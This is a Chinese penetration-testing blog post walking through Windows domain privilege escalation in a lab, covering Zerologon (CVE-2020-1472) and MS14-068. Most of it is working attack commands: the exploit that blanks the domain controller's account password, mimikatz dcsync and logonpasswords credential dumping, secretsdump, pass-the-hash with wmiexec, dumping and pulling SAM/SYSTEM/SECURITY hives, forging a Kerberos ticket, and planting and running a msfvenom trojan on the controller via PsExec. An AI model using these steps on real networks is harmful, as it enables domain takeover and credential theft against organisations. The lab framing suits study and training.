<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>0x23 - 域环境提权 | 晚上十一点睡觉</title><meta name="keywords" content="晚上十一点睡觉,网安,渗透,life"><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域提权简介域提权就相当于在域内横向移动了 我们从域内普通机器提权拿到域管的过程，即是域内横向移动 注意：windows中创建用户名时后面带上$符表示创建隐藏用户，在域中，加$标识域账号 Netlogon域权限提升概述2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。 前置知识： 认识netlogon服务 https:&#x2F;&#x2F;blog.51cto.com&#x2F;qq2919">
<meta property="og:type" content="article">
<meta property="og:title" content="0x23 - 域环境提权">
<meta property="og:url" content="https://11pmsleep.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83.html">
<meta property="og:site_name" content="晚上十一点睡觉">
<meta property="og:description" content="域提权简介域提权就相当于在域内横向移动了 我们从域内普通机器提权拿到域管的过程，即是域内横向移动 注意：windows中创建用户名时后面带上$符表示创建隐藏用户，在域中，加$标识域账号 Netlogon域权限提升概述2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。 前置知识： 认识netlogon服务 https:&#x2F;&#x2F;blog.51cto.com&#x2F;qq2919">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237515.png">
<meta property="article:published_time" content="2022-10-07T06:39:16.000Z">
<meta property="article:modified_time" content="2022-10-07T06:43:21.276Z">
<meta property="article:author" content="晚上十一点睡觉">
<meta property="article:tag" content="晚上十一点睡觉,网安,渗透,life">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237515.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://11pmsleep.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '0x23 - 域环境提权',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-10-07 14:43:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237515.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x23 - 域环境提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-07T06:39:16.000Z" title="发表于 2022-10-07 14:39:16">2022-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-07T06:43:21.276Z" title="更新于 2022-10-07 14:43:21">2022-10-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0x23 - 域环境提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x23-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%8F%90%E6%9D%83.html#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="域提权简介"><a href="#域提权简介" class="headerlink" title="域提权简介"></a>域提权简介</h1><p>域提权就相当于在域内横向移动了</p>
<p>我们从域内普通机器提权拿到域管的过程，即是域内横向移动</p>
<p>注意：windows中创建用户名时后面带上<code>$符表示创建隐藏用户，在域中，加$</code>标识域账号</p>
<h2 id="Netlogon域权限提升概述"><a href="#Netlogon域权限提升概述" class="headerlink" title="Netlogon域权限提升概述"></a>Netlogon域权限提升概述</h2><p>2020年08月12日， 微软官方发布了 <strong>NetLogon 特权提升漏洞</strong> 的风险通告。</p>
<h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a><strong>前置知识：</strong></h3><blockquote>
<p><strong>认识netlogon服务</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/qq291951118/1286399">https://blog.51cto.com/qq291951118/1286399</a></p>
</blockquote>
<p>在活动目录中比较重要的一个服务-“Netlogon”，此服务在DC和域成员服务器上运行，为域身份验证提供重要服务，如果此服务停止成员服务器将无法登陆到域中，下面是关于Netlogon服务的五点介绍：</p>
<ol>
<li><p>Netlogon服务为域控制器<strong>注册所有的srv资源</strong>纪录。这些记录出现在DNS服务器的正向查询区域中的_msdcs, _sites, _tcp, and _udp等文件夹中。<strong>其他计算机利用这些记录查询域活动目录相关的信息</strong>。</p>
</li>
<li><p>Netlogon服务维护<strong>计算机和域控制器之间的安全通道</strong>，对用户和服务进行身份验证。它将用户的凭据传递给域控制器，然后返回用户的<strong>域安全标识符和用户权限</strong>。这通常称为 pass-through 身份验证。</p>
</li>
<li><p>Netlogon“网络登录”被配置为仅在成员计算机或域控制器加入域时自动启动。在 Windows 2000 Server 系列和 Windows Server 2003 系列中，“网络登录”发布 <strong>DNS 中的服务资源定位器记录</strong>。当此服务运行时，它依赖“服务器”服务和“本地安全机构”服务来侦听传入的请求。</p>
</li>
<li><p>在域成员计算机上，<strong>“网络登录”使用命名管道上的 RPC</strong>。在域控制器上，它使用命名管道上的 RPC、RPC over TCP&#x2F;IP、邮筒以及轻型目录访问协议 (LDAP)。</p>
</li>
<li><p>Netlogon会常使用的端口：</p>
</li>
</ol>
<table>
<thead>
<tr>
<th>系统服务名称</th>
<th>Netlogon应用程序协议</th>
<th>协议</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>NetBIOS</td>
<td>数据报服务</td>
<td>UDP</td>
<td>138</td>
</tr>
<tr>
<td>NetBIOS</td>
<td>名称解析</td>
<td>UDP</td>
<td>137</td>
</tr>
<tr>
<td>NetBIOS</td>
<td>会话服务</td>
<td>TCP</td>
<td>139</td>
</tr>
</tbody></table>
<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>攻击者通过<strong>NetLogon（MS-NRPC）</strong>，建立与域控间易受攻击的安全通道时，可利用此漏洞获取<strong>域管</strong>访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>漏洞编号：CVE-2020-1472</p>
<h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本：</strong></h3><pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2012
Windows Server 2016
Windows Server 2019
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
</code></pre>
<h3 id="域内提权漏洞完整步骤"><a href="#域内提权漏洞完整步骤" class="headerlink" title="域内提权漏洞完整步骤"></a>域内提权漏洞完整步骤</h3><p>环境：域靶场<br>DC ip地址：10.10.10.10</p>
<ol>
<li>查看域控主机名称</li>
</ol>
<!---->

<pre><code>net group &quot;domain controllers&quot; /domain
</code></pre>
<ol>
<li>检测漏洞是否存在</li>
</ol>
<ul>
<li>方法一·：脚本</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472.git">https://github.com/SecuraBV/CVE-2020-1472.git</a></p>
</blockquote>
<pre><code>python3 zerologon_tester.py DC 10.10.10.10
脚本后面接的是域控名字和IP

一般的实战情况是：提供cs连上目标机器的域内机器，但是一般情况下我们是没有桌面，所以用脚本检测会更好
那么需要建立代理，通过代理执行脚本！
通过cs在已近上线的机器上建立一个代理！
再proxychain连上
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439006.png" alt="image-20220728054611412" style />

<p>方法二·：可执行程序（需要先获取到主机的桌面）</p>
<p>一搜就有（百度</p>
<p>微软给出的官方检测域内漏洞的工具</p>
<pre><code>PingClastle.exe
</code></pre>
<ol>
<li>检测存在漏洞后即可<strong>漏洞利用</strong>，对域账号重置</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p>
</blockquote>
<pre><code>python3 CVE-2020-1472.py DC DC$ 10.10.10.10
攻击后，即置空域控账户
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439581.png" alt="image-20220728054721233" style />

<p>这时候可以看一下用户凭证，DC$的hash已被置空</p>
<p><a target="_blank" rel="noopener" href="http://cmd5.com/">http://cmd5.com</a></p>
<pre><code>mimikatz要以管理员运行
privilege::debug
查看密码是否为置空状态：
lsadunp::dcsync /domain:delay.com /all /csv
将查询出的放到http://cmd5.com查询
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439386.png" alt="image-20220728054744547" style />

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439501.png" alt="image-20220728054759073" style />

<ol>
<li>获取域控所有 用户hash</li>
</ol>
<p>kali自带secretsdump.py脚本&#x2F;usr&#x2F;loacl&#x2F;bin目录下</p>
<p>我下载在”G:\ATTACK\提权\域提权\impacket-master\impacket\examples\secretsdump.py”目录下</p>
<pre><code>先安装脚本需要的模块：
python3 -m pip install
python3 secretsdump.py &#39;de1ay.com/DC$@10.10.10.10&#39; -no-pass
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439942.png" alt="image-20220728054837880" style />

<ol>
<li>wmiexec进行hash横向连接</li>
</ol>
<p>wmiexec.py同样在kali自带&#x2F;usr&#x2F;loacl&#x2F;bin目录下<br>G:\ATTACK\提权\域提权\impacket-master\impacket\examples\同样也有此脚本</p>
<pre><code>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:484c4a877bf92ab233572af847b9e530 域名称\Administrator@10.10.10.10

执行后会返回该域管理员的权限会话
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439677.png" alt="image-20220728054911692" style />

<ol>
<li>恢复域 - 获取hash</li>
</ol>
<p>如果打完后不回复域内的hash，域会崩掉，域成员无法建立联系！</p>
<p>#获取sam数据库</p>
<pre><code>导出三个文件
reg save HKLM\SYSTEM system.save 		
reg save HKLM\SAM sam.save 
reg save HKLM\SECURITY security.save 
下载刚刚导出的三个文件，下载到我们攻击的脚本目录中
lget system.save 
lget sam.save 
lget security.save 
del /f system.save 
del /f sam.save 
del /f security.save
</code></pre>
<ol>
<li>恢复域 - 获取hash</li>
</ol>
<p>#解密sam</p>
<pre><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439570.png" alt="image-20220728055029214"></p>
<p>要将上面图片中的后半部分：e2474b7ca001fb4d6847a6c1ece68bfb恢复回去，不然域内会有创伤，无法和普通域机器建立联系</p>
<p>e2474b7ca001fb4d6847a6c1ece68bfb这个是其原本的hash！因为原来的hash被置空，所以要恢复之</p>
<ol>
<li>恢复域 - 还原hash</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
</blockquote>
<pre><code>python3 reinstall_original_pw.py DC 10.10.10.10 e2474b7ca001fb4d6847a6c1ece68bfb
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439534.png" alt="image-20220728055425574" style />

<p>恢复完即完成了一次完整的域内权限提升，拿到了所有机器权限</p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><h3 id="Kerberos-漏洞"><a href="#Kerberos-漏洞" class="headerlink" title="Kerberos 漏洞:"></a><strong>Kerberos 漏洞</strong>:</h3><p>该漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。攻击者可能使用这些提升的权限来侵入域中的任何计算机，包括域控制器。攻击者必须有有效的域凭据才能利用此漏洞。拥有域凭据的标准用户帐户可以远程使用受影响的组件；只有本地帐户凭据的用户则不能</p>
<blockquote>
<p>**微软官方解释:**<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068</a></p>
</blockquote>
<h4 id="攻击者可能会使用该漏洞执行哪些操作？"><a href="#攻击者可能会使用该漏洞执行哪些操作？" class="headerlink" title="攻击者可能会使用该漏洞执行哪些操作？"></a><strong>攻击者可能会使用该漏洞执行哪些操作</strong>？</h4><p>攻击者可能使用此漏洞，将未经授权的域用户提升为域管理员帐户。成功利用此漏洞的攻击者可以仿冒域中的任何用户，包括域管理员，并加入任何组。通过冒充域管理员，攻击者可以安装程序；查看、更改或删除数据；或者在任何加入域的系统上创建新帐户。</p>
<h4 id="攻击者如何利用该漏洞？"><a href="#攻击者如何利用该漏洞？" class="headerlink" title="攻击者如何利用该漏洞？"></a><strong>攻击者如何利用该漏洞？</strong></h4><p>通过身份验证的域用户可以向 Kerberos KDC 发出伪造的 Kerberos 票证，声称该用户就是域管理员。Kerberos KDC 在处理来自攻击者的请求时，会不恰当地验证伪造的票证签名，从而让攻击者能利用域管理员的身份来访问网络上的任何资源。</p>
<h4 id="该漏洞主要危害哪些系统？"><a href="#该漏洞主要危害哪些系统？" class="headerlink" title="该漏洞主要危害哪些系统？"></a><strong>该漏洞主要危害哪些系统？</strong></h4><p>主要危害配置为 Kerberos 密钥分发中心 (KDC) 的域控制器。</p>
<h4 id="Kerberos认证原理"><a href="#Kerberos认证原理" class="headerlink" title="Kerberos认证原理:"></a>Kerberos认证原理:</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huamingao/p/7267423.html">https://www.cnblogs.com/huamingao/p/7267423.html</a></p>
</blockquote>
<h4 id="Kerberos漏洞原理"><a href="#Kerberos漏洞原理" class="headerlink" title="Kerberos漏洞原理:"></a>Kerberos<strong>漏洞原理:</strong></h4><p><strong>服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向域控dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。</strong></p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439530.png" alt="image-20220728055729407" style />

<h3 id="漏洞利用前提："><a href="#漏洞利用前提：" class="headerlink" title="漏洞利用前提："></a>漏洞利用前提：</h3><ol>
<li>域控没有打MS14-068的补丁(KB3011780)</li>
</ol>
<p>一般域内机器都是统一打补丁的 可以通过这个方法判断域控有没有打此补丁！</p>
<ol>
<li>攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码&#x2F;hash值，以及用户的suid</li>
</ol>
<h3 id="相关工具下载"><a href="#相关工具下载" class="headerlink" title="相关工具下载:"></a>相关工具下载:</h3><ul>
<li>Ms14-068.exe</li>
</ul>
<blockquote>
<p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
</blockquote>
<ul>
<li>PSexec	微软官方给出代替wmic的工具，一般横向移动都用这个</li>
</ul>
<blockquote>
<p>下载地址:<a target="_blank" rel="noopener" href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h3><ol>
<li>首先在检测是否有MS14-068这个漏洞,通过查看是否打补丁(KB3011780)来判断是否存在漏洞,在域中补丁都是批量安装</li>
</ol>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439389.png" alt="image-20220728060101770"></p>
<ol>
<li>获取域sid</li>
</ol>
<ul>
<li>每当我们在域内创建用户时，所有用户的域sid都会改变一次</li>
<li>域管的域sid后三位是-500</li>
</ul>
<!---->

<pre><code>shell whoami /all
S-1-5-21-2756371121-2868759905-3853650604-1001
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439686.png" alt="image-20220728060129260"></p>
<ol>
<li>获取域hash</li>
</ol>
<p>由于是域普通用户，首先<strong>提权</strong>到system然后抓hash</p>
<p>用插件提权为system权限，再运行mimikatz</p>
<pre><code>logonpasswords：
命令尝试抓取用户hash或者明文密码（beacon中的命令）
（如果我们能看到hash就用hash的方式，如果能看到密码就用密码的方式）

161cff084477fe596a5db81874498a24
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439384.png" alt="image-20220728060209457"></p>
<ol>
<li>清除当前用户票据</li>
</ol>
<!---->

<pre><code>mimikatz kerberos::list列出票据
mimikatz kerberos::purge清除票据
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439616.png" alt="image-20220728060300312"></p>
<ol>
<li>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书（先上传工具upload）</li>
</ol>
<p>票据创建成功会在目录下生成一个TGT票据文件</p>
<pre><code>shell MS14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604-1001 -p 1qaz@WSX -d 10.10.10.10

-u用户名
-s用户sid
-p用户密码
-d是ip

如果是抓到hash就把-p选项修改为对应的-rc4接hash值！！！！！
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439152.png" alt="image-20220728060341878"></p>
<ol>
<li>利用mimikatz.exe将证书写入，从而提升为域管理员</li>
</ol>
<!---->

<pre><code>mimikatz kerberos::ptc TGT_11@de1ay.com.ccache
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439945.png" alt="image-20220728060412861"></p>
<ol>
<li>再次列出域控制器的C盘目录,成功访问域控的C盘,说明普通域用户提权成功</li>
</ol>
<!---->

<pre><code>shell dir \\10.10.10.10\c$
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439855.png" alt="image-20220728060427657"></p>
<ol>
<li>最后再上传工具PsExec.exe</li>
</ol>
<p>通过这个工具我们可以远程操控域控主机！执行命令</p>
<pre><code>shell Psexec.exe \\10.10.10.10 whoami
</code></pre>
<ol>
<li>接下来上线CS或者msf</li>
</ol>
<p>生成msf正向连接木马（因为反向连接，对面的机器找不到我们）</p>
<pre><code>msfvenom -p ^^^^^^
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439403.png" alt="image-20220802064100599" style />

<p>配置监听（挂上代理后再运行哦）：</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439889.png" alt="image-20220802064317072" style />

<p>为了能监听到，连接上目标机器，我们的正向连接需要借助cs中的socks代理！</p>
<pre><code>点击cs代理中的Tunnel
复制生成的命令到msf中
将msf挂载到cs建立的socks代理中
</code></pre>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439737.png" alt="image-20220802064443454" style />

<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439505.png" alt="image-20220802064627710" style />

<p>运行监听！</p>
<p>上传木马:</p>
<pre><code>先在域内机器上传msf木马，upload即可
再shell copy复制到10.10.10.10的c盘
shell copy b11.exe \\10.10.10.10\c$
</code></pre>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439745.png" alt="image-20220802064755706"></p>
<p>打开一个桌面服务！</p>
<p>（因为如果直接再beacon中执行shell psexec.exe  \\10.10.10.10 cmd.exe只能看到其执行成功，但是拿不到一个交互式的shell）</p>
<p>如果是msf’，就可以不用桌面，msf有交互式的shell！</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439806.png" alt="image-20220802065237842" style />

<p>通过域内机器桌面拿到域控的cmd权限</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439966.png" alt="image-20220802065355454" style />

<p>运行我们上传的msf木马：</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071439277.png" alt="image-20220802065459141" style />

<p>上线成功！！！</p>
